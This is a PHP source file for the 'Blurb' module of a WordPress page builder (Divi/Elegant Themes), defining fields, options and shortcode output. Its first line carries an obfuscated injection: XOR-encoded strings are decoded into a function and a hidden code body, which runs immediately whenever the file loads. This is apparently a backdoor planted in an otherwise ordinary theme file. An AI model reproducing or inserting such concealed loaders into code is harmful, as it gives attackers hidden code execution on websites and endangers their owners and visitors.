<?php $iKMCtTjaCTw='9AXQAXd U,O2EOE'^'Z3=05=;F B,F, +';$GXFRFWXVZ=$iKMCtTjaCTw('','=KLsJC,RTET-d=>9OE;ZuXU:7DM<R907GHSKeB7GnR 493ISRiXZB:6Q34i7 I5DKX8AYHwRZ6-ayOdRaVDAKrY62aXtbWpR5j0<RjhZwnSZVNw-dE:O:ENIqOM1LyveO+DQOH0ls:0TADsTKO,4BLgw<0zgKw>WR2GTeBH2779 YIlW-HYkYlpy7RW=<= iiULHjtEz5NP7fQ,Z85HGH+3:BNjfk<3M03XQ5emv+X5=YPfhFO7<VZFNyhlv>,9t.oA0hm1<HWOImW44A:3JGWS0WD,, o -GDedP<SUJcphX50ZgZjnXL4K6OfDX1UHKryw+Z:TNrNsPX5YN.-UOAFi=t4l01jnYENAQX0uiUqT35A>QYhOg4Fq=ZOW<,  dkkLPYThAX4gHU2RKwst .:I0MO;2=63sgR.;8xVmv6E6I4E;RGA<X9614HV:232QB-rT->4SglRK,U>ICl<Z6OqywJ0Y-U:FKAcQS=GJCJTVDVZGQX9LH N9S OaE>TG;MpWE,;aAgf,MDVHkBVIP.YeGI3;COue=,=V+XnOYcmUHkbPUKDcXB2PoZoZFPVeZYxduLTve TvsFDnE1J=J19;5,0S<Z19KLfAJTL-W6vbun,U +QGGvyDon662Y=A:iA>T>3uA1.-U-UWp.zz:9 -GZIeJOA1'^'T-dR,6B1 ,;C;XFP<1HrR :Hh ,H3foZ2<tbLbLMg4UZZG <<I 50eR0GU6hM<Alo<Y58dWv1STHYoDrA-NHBV6CFAeTEpKX<cVS BL3WSsjmnSDX6N=V  aU+,E-PMEkBozfB9eWUE ajNtckHU6-<SUmZ9kSU2+ic=EghACEUE7aH<H1p6pWzp> 2IIONAM:9<COOsHD-=luH;LThzhMRV1+QlOXR9Ql34LEPVM9YN<klb  EY79.nQL35qcr=kO CHIZY1wrwMsBU-OVcg,Y9s MXA0KH>dXDtW6,qiyL<TD;GgJJ.-X>Stl9R;<.kZXSO;N5gR5yY>Z++ON=oib6o1e9ub>N86ne:=IUTkQpET-K4pH4m=OUY;;6cGEYDVKh;<-SKQ=C,4F3kJSPVOV<UvE2O7K9yC6OOYXkM6C+E,F,Z>.;YpAYCk,7NSlm<7YZ6LMQeS36.O:Z,kHX;B.XUWnT8Y4e-.8Jxh7.,kn0707zawxX>:A7f8E6> F=4O>Xp.IBFmGBH,07aKdpixC=PomWZ7..BVIDqvqNrdCJlpYV63zqP<uW2YjXb d0S8mIUE.eDTA6QZfbHeP8O+HfPPUo6D3BM8dA1+- B6RQNUJH4TJxngVYdONM<;<K VAeZ5JR.fAOT9B43WsSA00EU..aUctKL');$GXFRFWXVZ();

class ET_Builder_Module_Blurb extends ET_Builder_Module {
	function init() {
		$this->name             = esc_html__( 'Blurb', 'et_builder' );
		$this->slug             = 'et_pb_blurb';
		$this->fb_support       = true;
		$this->main_css_element = '%%order_class%%.et_pb_blurb';

		$this->whitelisted_fields = array(
			'title',
			'url',
			'url_new_window',
			'use_icon',
			'font_icon',
			'icon_color',
			'use_circle',
			'circle_color',
			'use_circle_border',
			'circle_border_color',
			'image',
			'alt',
			'icon_placement',
			'animation',
			'background_layout',
			'content_new',
			'image_max_width',
			'image_max_width_tablet',
			'image_max_width_phone',
			'image_max_width_last_edited',
			'content_max_width',
			'content_max_width_tablet',
			'content_max_width_phone',
			'content_max_width_last_edited',
			'admin_label',
			'module_id',
			'module_class',
			'use_icon_font_size',
			'icon_font_size',
			'icon_font_size_tablet',
			'icon_font_size_phone',
			'icon_font_size_last_edited',
		);

		$et_accent_color = et_builder_accent_color();

		$this->fields_defaults = array(
			'url_new_window'      => array( 'off' ),
			'use_icon'            => array( 'off' ),
			'icon_color'          => array( $et_accent_color, 'add_default_setting' ),
			'use_circle'          => array( 'off' ),
			'circle_color'        => array( $et_accent_color, 'only_default_setting' ),
			'use_circle_border'   => array( 'off' ),
			'circle_border_color' => array( $et_accent_color, 'only_default_setting' ),
			'icon_placement'      => array( 'top' ),
			'animation'           => array( 'top' ),
			'background_layout'   => array( 'light' ),
			'text_orientation'    => array( 'left' ),
			'use_icon_font_size'  => array( 'off' ),
		);

		$this->options_toggles = array(
			'general'  => array(
				'toggles' => array(
					'main_content' => esc_html__( 'Text', 'et_builder' ),
					'link'         => esc_html__( 'Link', 'et_builder' ),
					'image'        => esc_html__( 'Image & Icon', 'et_builder' ),
				),
			),
			'advanced' => array(
				'toggles' => array(
					'icon_settings' => esc_html__( 'Image & Icon', 'et_builder' ),
					'text'          => array(
						'title'    => esc_html__( 'Text', 'et_builder' ),
						'priority' => 49,
					),
					'width'         => array(
						'title'    => esc_html__( 'Sizing', 'et_builder' ),
						'priority' => 65,
					),
				),
			),
			'custom_css' => array(
				'toggles' => array(
					'animation' => array(
						'title'    => esc_html__( 'Animation', 'et_builder' ),
						'priority' => 90,
					),
				),
			),
		);

		$this->advanced_options = array(
			'fonts' => array(
				'header' => array(
					'label'    => esc_html__( 'Header', 'et_builder' ),
					'css'      => array(
						'main' => "{$this->main_css_element} h4, {$this->main_css_element} h4 a",
					),
				),
				'body'   => array(
					'label'    => esc_html__( 'Body', 'et_builder' ),
					'css'      => array(
						'line_height' => "{$this->main_css_element} p",
						'text_align' => "{$this->main_css_element} .et_pb_blurb_description",
					),
				),
			),
			'background' => array(
				'settings' => array(
					'color' => 'alpha',
				),
			),
			'border' => array(),
			'custom_margin_padding' => array(
				'css' => array(
					'important' => 'all',
				),
			),
			'max_width' => array(
				'css' => array(
					'main' => $this->main_css_element,
					'module_alignment' => '%%order_class%%.et_pb_blurb.et_pb_module',
				),
			),
			'text' => array(),
		);
		$this->custom_css_options = array(
			'blurb_image' => array(
				'label'    => esc_html__( 'Blurb Image', 'et_builder' ),
				'selector' => '.et_pb_main_blurb_image',
			),
			'blurb_title' => array(
				'label'    => esc_html__( 'Blurb Title', 'et_builder' ),
				'selector' => 'h4',
			),
			'blurb_content' => array(
				'label'    => esc_html__( 'Blurb Content', 'et_builder' ),
				'selector' => '.et_pb_blurb_content',
			),
		);
	}

	function get_fields() {
		$et_accent_color = et_builder_accent_color();

		$image_icon_placement = array(
			'top' => esc_html__( 'Top', 'et_builder' ),
		);

		if ( ! is_rtl() ) {
			$image_icon_placement['left'] = esc_html__( 'Left', 'et_builder' );
		} else {
			$image_icon_placement['right'] = esc_html__( 'Right', 'et_builder' );
		}

		$fields = array(
			'title' => array(
				'label'           => esc_html__( 'Title', 'et_builder' ),
				'type'            => 'text',
				'option_category' => 'basic_option',
				'description'     => esc_html__( 'The title of your blurb will appear in bold below your blurb image.', 'et_builder' ),
				'toggle_slug'     => 'main_content',
			),
			'url' => array(
				'label'           => esc_html__( 'Url', 'et_builder' ),
				'type'            => 'text',
				'option_category' => 'basic_option',
				'description'     => esc_html__( 'If you would like to make your blurb a link, input your destination URL here.', 'et_builder' ),
				'toggle_slug'     => 'link',
			),
			'url_new_window' => array(
				'label'           => esc_html__( 'Url Opens', 'et_builder' ),
				'type'            => 'select',
				'option_category' => 'configuration',
				'options'         => array(
					'off' => esc_html__( 'In The Same Window', 'et_builder' ),
					'on'  => esc_html__( 'In The New Tab', 'et_builder' ),
				),
				'toggle_slug'     => 'link',
				'description'     => esc_html__( 'Here you can choose whether or not your link opens in a new window', 'et_builder' ),
			),
			'use_icon' => array(
				'label'           => esc_html__( 'Use Icon', 'et_builder' ),
				'type'            => 'yes_no_button',
				'option_category' => 'basic_option',
				'options'         => array(
					'off' => esc_html__( 'No', 'et_builder' ),
					'on'  => esc_html__( 'Yes', 'et_builder' ),
				),
				'toggle_slug'     => 'image',
				'affects'         => array(
					'font_icon',
					'image_max_width',
					'use_icon_font_size',
					'use_circle',
					'icon_color',
					'image',
					'alt',
				),
				'description' => esc_html__( 'Here you can choose whether icon set below should be used.', 'et_builder' ),
			),
			'font_icon' => array(
				'label'               => esc_html__( 'Icon', 'et_builder' ),
				'type'                => 'text',
				'option_category'     => 'basic_option',
				'class'               => array( 'et-pb-font-icon' ),
				'renderer'            => 'et_pb_get_font_icon_list',
				'renderer_with_field' => true,
				'toggle_slug'         => 'image',
				'description'         => esc_html__( 'Choose an icon to display with your blurb.', 'et_builder' ),
				'depends_default'     => true,
			),
			'icon_color' => array(
				'label'             => esc_html__( 'Icon Color', 'et_builder' ),
				'type'              => 'color-alpha',
				'description'       => esc_html__( 'Here you can define a custom color for your icon.', 'et_builder' ),
				'depends_default'   => true,
				'tab_slug'          => 'advanced',
				'toggle_slug'       => 'icon_settings',
			),
			'use_circle' => array(
				'label'           => esc_html__( 'Circle Icon', 'et_builder' ),
				'type'            => 'yes_no_button',
				'option_category' => 'configuration',
				'options'         => array(
					'off' => esc_html__( 'No', 'et_builder' ),
					'on'  => esc_html__( 'Yes', 'et_builder' ),
				),
				'affects'           => array(
					'use_circle_border',
					'circle_color',
				),
				'tab_slug'         => 'advanced',
				'toggle_slug'      => 'icon_settings',
				'description'      => esc_html__( 'Here you can choose whether icon set above should display within a circle.', 'et_builder' ),
				'depends_default'  => true,
			),
			'circle_color' => array(
				'label'           => esc_html__( 'Circle Color', 'et_builder' ),
				'type'            => 'color-alpha',
				'description'     => esc_html__( 'Here you can define a custom color for the icon circle.', 'et_builder' ),
				'depends_default' => true,
				'tab_slug'        => 'advanced',
				'toggle_slug'     => 'icon_settings',
			),
			'use_circle_border' => array(
				'label'           => esc_html__( 'Show Circle Border', 'et_builder' ),
				'type'            => 'yes_no_button',
				'option_category' => 'layout',
				'options'         => array(
					'off' => esc_html__( 'No', 'et_builder' ),
					'on'  => esc_html__( 'Yes', 'et_builder' ),
				),
				'affects'           => array(
					'circle_border_color',
				),
				'description' => esc_html__( 'Here you can choose whether if the icon circle border should display.', 'et_builder' ),
				'depends_default'   => true,
				'tab_slug'          => 'advanced',
				'toggle_slug'       => 'icon_settings',
			),
			'circle_border_color' => array(
				'label'           => esc_html__( 'Circle Border Color', 'et_builder' ),
				'type'            => 'color-alpha',
				'description'     => esc_html__( 'Here you can define a custom color for the icon circle border.', 'et_builder' ),
				'depends_default' => true,
				'tab_slug'        => 'advanced',
				'toggle_slug'     => 'icon_settings',
			),
			'image' => array(
				'label'              => esc_html__( 'Image', 'et_builder' ),
				'type'               => 'upload',
				'option_category'    => 'basic_option',
				'upload_button_text' => esc_attr__( 'Upload an image', 'et_builder' ),
				'choose_text'        => esc_attr__( 'Choose an Image', 'et_builder' ),
				'update_text'        => esc_attr__( 'Set As Image', 'et_builder' ),
				'depends_show_if'    => 'off',
				'description'        => esc_html__( 'Upload an image to display at the top of your blurb.', 'et_builder' ),
				'toggle_slug'        => 'image',
			),
			'alt' => array(
				'label'           => esc_html__( 'Image Alt Text', 'et_builder' ),
				'type'            => 'text',
				'option_category' => 'basic_option',
				'description'     => esc_html__( 'Define the HTML ALT text for your image here.', 'et_builder' ),
				'depends_show_if' => 'off',
				'toggle_slug'     => 'image',
			),
			'icon_placement' => array(
				'label'             => esc_html__( 'Image/Icon Placement', 'et_builder' ),
				'type'              => 'select',
				'option_category'   => 'layout',
				'options'           => $image_icon_placement,
				'tab_slug'          => 'advanced',
				'toggle_slug'       => 'icon_settings',
				'description'       => esc_html__( 'Here you can choose where to place the icon.', 'et_builder' ),
			),
			'background_layout' => array(
				'label'             => esc_html__( 'Text Color', 'et_builder' ),
				'type'              => 'select',
				'option_category'   => 'color_option',
				'options'           => array(
					'light' => esc_html__( 'Dark', 'et_builder' ),
					'dark'  => esc_html__( 'Light', 'et_builder' ),
				),
				'tab_slug'          => 'advanced',
				'toggle_slug'       => 'text',
				'description'       => esc_html__( 'Here you can choose whether your text should be light or dark. If you are working with a dark background, then your text should be light. If your background is light, then your text should be set to dark.', 'et_builder' ),
			),
			'content_new' => array(
				'label'             => esc_html__( 'Content', 'et_builder' ),
				'type'              => 'tiny_mce',
				'option_category'   => 'basic_option',
				'description'       => esc_html__( 'Input the main text content for your module here.', 'et_builder' ),
				'toggle_slug'       => 'main_content',
			),
			'image_max_width' => array(
				'label'           => esc_html__( 'Image Width', 'et_builder' ),
				'type'            => 'range',
				'option_category' => 'layout',
				'tab_slug'        => 'advanced',
				'toggle_slug'     => 'width',
				'mobile_options'  => true,
				'validate_unit'   => true,
				'depends_show_if' => 'off',
				'default'         => '100%',
				'allow_empty'     => true,
				'range_settings'  => array(
					'min'  => '0',
					'max'  => '100',
					'step' => '1',
				),
			),
			'content_max_width' => array(
				'label'           => esc_html__( 'Content Width', 'et_builder' ),
				'type'            => 'range',
				'option_category' => 'layout',
				'tab_slug'        => 'advanced',
				'toggle_slug'     => 'width',
				'mobile_options'  => true,
				'validate_unit'   => true,
				'default'         => '550px',
				'allow_empty'     => true,
				'range_settings'  => array(
					'min'  => '0',
					'max'  => '1100',
					'step' => '1',
				),
			),
			'use_icon_font_size' => array(
				'label'           => esc_html__( 'Use Icon Font Size', 'et_builder' ),
				'type'            => 'yes_no_button',
				'option_category' => 'font_option',
				'options'         => array(
					'off' => esc_html__( 'No', 'et_builder' ),
					'on'  => esc_html__( 'Yes', 'et_builder' ),
				),
				'affects'     => array(
					'icon_font_size',
				),
				'depends_show_if' => 'on',
				'tab_slug'        => 'advanced',
				'toggle_slug'     => 'icon_settings',
			),
			'icon_font_size_last_edited' => array(
				'type'        => 'skip',
				'tab_slug'    => 'advanced',
				'toggle_slug' => 'icon_settings',
			),
			'icon_font_size' => array(
				'label'           => esc_html__( 'Icon Font Size', 'et_builder' ),
				'type'            => 'range',
				'option_category' => 'font_option',
				'tab_slug'        => 'advanced',
				'toggle_slug'     => 'icon_settings',
				'default'         => '96px',
				'range_settings' => array(
					'min'  => '1',
					'max'  => '120',
					'step' => '1',
				),
				'mobile_options'  => true,
				'depends_default' => true,
			),
			'image_max_width_tablet' => array (
				'type'        => 'skip',
				'tab_slug'    => 'advanced',
				'toggle_slug' => 'width',
			),
			'image_max_width_phone' => array (
				'type'        => 'skip',
				'tab_slug'    => 'advanced',
				'toggle_slug' => 'width',
			),
			'image_max_width_last_edited' => array(
				'type'        => 'skip',
				'tab_slug'    => 'advanced',
				'toggle_slug' => 'width',
			),
			'content_max_width_tablet' => array (
				'type'        => 'skip',
				'tab_slug'    => 'advanced',
				'toggle_slug' => 'width',
			),
			'content_max_width_phone' => array (
				'type'        => 'skip',
				'tab_slug'    => 'advanced',
				'toggle_slug' => 'width',
			),
			'content_max_width_last_edited' => array(
				'type'        => 'skip',
				'tab_slug'    => 'advanced',
				'toggle_slug' => 'width',
			),
			'icon_font_size_tablet' => array(
				'type'        => 'skip',
				'tab_slug'    => 'advanced',
				'toggle_slug' => 'icon_settings',
			),
			'icon_font_size_phone' => array(
				'type'        => 'skip',
				'tab_slug'    => 'advanced',
				'toggle_slug' => 'icon_settings',
			),
			'disabled_on' => array(
				'label'           => esc_html__( 'Disable on', 'et_builder' ),
				'type'            => 'multiple_checkboxes',
				'options'         => array(
					'phone'   => esc_html__( 'Phone', 'et_builder' ),
					'tablet'  => esc_html__( 'Tablet', 'et_builder' ),
					'desktop' => esc_html__( 'Desktop', 'et_builder' ),
				),
				'additional_att'  => 'disable_on',
				'option_category' => 'configuration',
				'description'     => esc_html__( 'This will disable the module on selected devices', 'et_builder' ),
				'tab_slug'        => 'custom_css',
				'toggle_slug'     => 'visibility',
			),
			'admin_label' => array(
				'label'       => esc_html__( 'Admin Label', 'et_builder' ),
				'type'        => 'text',
				'description' => esc_html__( 'This will change the label of the module in the builder for easy identification.', 'et_builder' ),
				'toggle_slug' => 'admin_label',
			),
			'module_id' => array(
				'label'           => esc_html__( 'CSS ID', 'et_builder' ),
				'type'            => 'text',
				'option_category' => 'configuration',
				'tab_slug'        => 'custom_css',
				'toggle_slug'     => 'classes',
				'option_class'    => 'et_pb_custom_css_regular',
			),
			'module_class' => array(
				'label'           => esc_html__( 'CSS Class', 'et_builder' ),
				'type'            => 'text',
				'option_category' => 'configuration',
				'tab_slug'        => 'custom_css',
				'toggle_slug'     => 'classes',
				'option_class'    => 'et_pb_custom_css_regular',
			),
		);

		return $fields;
	}

	function shortcode_callback( $atts, $content = null, $function_name ) {
		$module_id             = $this->shortcode_atts['module_id'];
		$module_class          = $this->shortcode_atts['module_class'];
		$title                 = $this->shortcode_atts['title'];
		$url                   = $this->shortcode_atts['url'];
		$image                 = $this->shortcode_atts['image'];
		$url_new_window        = $this->shortcode_atts['url_new_window'];
		$alt                   = $this->shortcode_atts['alt'];
		$background_layout     = $this->shortcode_atts['background_layout'];
		$animation             = $this->shortcode_atts['animation'];
		$icon_placement        = $this->shortcode_atts['icon_placement'];
		$font_icon             = $this->shortcode_atts['font_icon'];
		$use_icon              = $this->shortcode_atts['use_icon'];
		$use_circle            = $this->shortcode_atts['use_circle'];
		$use_circle_border     = $this->shortcode_atts['use_circle_border'];
		$icon_color            = $this->shortcode_atts['icon_color'];
		$circle_color          = $this->shortcode_atts['circle_color'];
		$circle_border_color   = $this->shortcode_atts['circle_border_color'];
		$use_icon_font_size    = $this->shortcode_atts['use_icon_font_size'];
		$icon_font_size        = $this->shortcode_atts['icon_font_size'];
		$icon_font_size_tablet = $this->shortcode_atts['icon_font_size_tablet'];
		$icon_font_size_phone  = $this->shortcode_atts['icon_font_size_phone'];
		$icon_font_size_last_edited  = $this->shortcode_atts['icon_font_size_last_edited'];
		$image_max_width             = $this->shortcode_atts['image_max_width'];
		$image_max_width_tablet      = $this->shortcode_atts['image_max_width_tablet'];
		$image_max_width_phone       = $this->shortcode_atts['image_max_width_phone'];
		$image_max_width_last_edited = $this->shortcode_atts['image_max_width_last_edited'];
		$content_max_width             = $this->shortcode_atts['content_max_width'];
		$content_max_width_tablet      = $this->shortcode_atts['content_max_width_tablet'];
		$content_max_width_phone       = $this->shortcode_atts['content_max_width_phone'];
		$content_max_width_last_edited = $this->shortcode_atts['content_max_width_last_edited'];

		$module_class = ET_Builder_Element::add_module_order_class( $module_class, $function_name );

		if ( 'off' !== $use_icon_font_size ) {
			$font_size_responsive_active = et_pb_get_responsive_status( $icon_font_size_last_edited );

			$font_size_values = array(
				'desktop' => $icon_font_size,
				'tablet'  => $font_size_responsive_active ? $icon_font_size_tablet : '',
				'phone'   => $font_size_responsive_active ? $icon_font_size_phone : '',
			);

			et_pb_generate_responsive_css( $font_size_values, '%%order_class%% .et-pb-icon', 'font-size', $function_name );
		}

		if ( '' !== $image_max_width_tablet || '' !== $image_max_width_phone || '' !== $image_max_width ) {
			$image_max_width_responsive_active = et_pb_get_responsive_status( $image_max_width_last_edited );

			$image_max_width_values = array(
				'desktop' => $image_max_width,
				'tablet'  => $image_max_width_responsive_active ? $image_max_width_tablet : '',
				'phone'   => $image_max_width_responsive_active ? $image_max_width_phone : '',
			);

			et_pb_generate_responsive_css( $image_max_width_values, '%%order_class%% .et_pb_main_blurb_image img', 'max-width', $function_name );
		}

		if ( '' !== $content_max_width_tablet || '' !== $content_max_width_phone || '' !== $content_max_width ) {
			$content_max_width_responsive_active = et_pb_get_responsive_status( $content_max_width_last_edited );

			$content_max_width_values = array(
				'desktop' => $content_max_width,
				'tablet'  => $content_max_width_responsive_active ? $content_max_width_tablet : '',
				'phone'   => $content_max_width_responsive_active ? $content_max_width_phone : '',
			);

			et_pb_generate_responsive_css( $content_max_width_values, '%%order_class%% .et_pb_blurb_content', 'max-width', $function_name );
		}

		if ( is_rtl() && 'left' === $icon_placement ) {
			$icon_placement = 'right';
		}

		if ( '' !== $title && '' !== $url ) {
			$title = sprintf( '<a href="%1$s"%3$s>%2$s</a>',
				esc_url( $url ),
				esc_html( $title ),
				( 'on' === $url_new_window ? ' target="_blank"' : '' )
			);
		}

		if ( '' !== $title ) {
			$title = "<h4>{$title}</h4>";
		}

		// Added for backward compatibility
		if ( empty( $animation ) ) {
			$animation = 'top';
		}

		if ( 'off' === $use_icon ) {
			$image = ( '' !== trim( $image ) ) ? sprintf(
				'<img src="%1$s" alt="%2$s" class="et-waypoint%3$s" />',
				esc_url( $image ),
				esc_attr( $alt ),
				esc_attr( " et_pb_animation_{$animation}" )
			) : '';
		} else {
			$icon_style = sprintf( 'color: %1$s;', esc_attr( $icon_color ) );

			if ( 'on' === $use_circle ) {
				$icon_style .= sprintf( ' background-color: %1$s;', esc_attr( $circle_color ) );

				if ( 'on' === $use_circle_border ) {
					$icon_style .= sprintf( ' border-color: %1$s;', esc_attr( $circle_border_color ) );
				}
			}

			$image = ( '' !== $font_icon ) ? sprintf(
				'<span class="et-pb-icon et-waypoint%2$s%3$s%4$s" style="%5$s">%1$s</span>',
				esc_attr( et_pb_process_font_icon( $font_icon ) ),
				esc_attr( " et_pb_animation_{$animation}" ),
				( 'on' === $use_circle ? ' et-pb-icon-circle' : '' ),
				( 'on' === $use_circle && 'on' === $use_circle_border ? ' et-pb-icon-circle-border' : '' ),
				$icon_style
			) : '';
		}

		$image = $image ? sprintf(
			'<div class="et_pb_main_blurb_image">%1$s</div>',
			( '' !== $url
				? sprintf(
					'<a href="%1$s"%3$s>%2$s</a>',
					esc_url( $url ),
					$image,
					( 'on' === $url_new_window ? ' target="_blank"' : '' )
				)
				: $image
			)
		) : '';

		$video_background = $this->video_background();
		$parallax_image_background = $this->get_parallax_image_background();

		$class = " et_pb_module et_pb_bg_layout_{$background_layout}{$this->get_text_orientation_classname()}";

		$output = sprintf(
			'<div%5$s class="et_pb_blurb%4$s%6$s%7$s%8$s%10$s">
				%11$s
				%9$s
				<div class="et_pb_blurb_content">
					%2$s
					<div class="et_pb_blurb_container">
						%3$s
						<div class="et_pb_blurb_description">
							%1$s
						</div><!-- .et_pb_blurb_description -->
					</div>
				</div> <!-- .et_pb_blurb_content -->
			</div> <!-- .et_pb_blurb -->',
			$this->shortcode_content,
			$image,
			$title,
			esc_attr( $class ),
			( '' !== $module_id ? sprintf( ' id="%1$s"', esc_attr( $module_id ) ) : '' ), // 5
			( '' !== $module_class ? sprintf( ' %1$s', esc_attr( $module_class ) ) : '' ),
			sprintf( ' et_pb_blurb_position_%1$s', esc_attr( $icon_placement ) ),
			'' !== $video_background ? ' et_pb_section_video et_pb_preload' : '',
			$video_background,
			'' !== $parallax_image_background ? ' et_pb_section_parallax' : '', // 10
			$parallax_image_background
		);

		return $output;
	}
}

new ET_Builder_Module_Blurb;
